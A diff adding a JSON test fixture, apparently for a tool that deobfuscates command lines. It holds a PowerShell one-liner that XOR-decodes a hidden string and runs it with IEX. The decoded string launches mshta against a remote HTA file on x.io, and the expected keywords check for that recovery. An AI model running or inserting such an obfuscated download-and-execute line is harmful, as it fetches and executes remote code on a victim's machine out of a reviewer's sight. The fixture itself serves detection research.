@@ -1,0 +1,11 @@
+{
+  "id": "ps-xor-ascii-6-mut0",
+  "category": "ps-xor-inline",
+  "command_line": "$k=[System.Text.Encoding]::ASCII.GetBytes('KEY');    $b=[byte[]](38,54,49,63,36,121,35,49,45,59,127,118,100,61,119,34,42,118,50,107,49,63,36);    $d=-join(0..($b.Length-1)|%{[char]($b[$_] -bxor $k[$_ % $k.Length])});    IEX $d",
+  "expected_keywords": [
+    "mshta",
+    "x.io"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
